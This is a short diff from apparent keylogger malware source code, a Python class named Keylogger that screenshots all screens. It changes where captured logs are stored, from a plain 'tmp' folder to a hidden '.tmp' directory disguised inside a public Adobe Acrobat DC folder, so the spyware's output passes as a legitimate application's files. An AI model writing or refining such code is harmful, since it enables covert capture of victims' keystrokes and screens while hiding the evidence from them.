@@ -37,7 +37,7 @@ class Keylogger:
         self.host = "127.0.0.1"
         self.port = 1005
 
-        self.log_directory = "tmp"
+        self.log_directory = "C:\\Users\\Public\\Documents\\Adobe\\Acrobat DC\\Acrobat\\.tmp"
 
         ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once
 
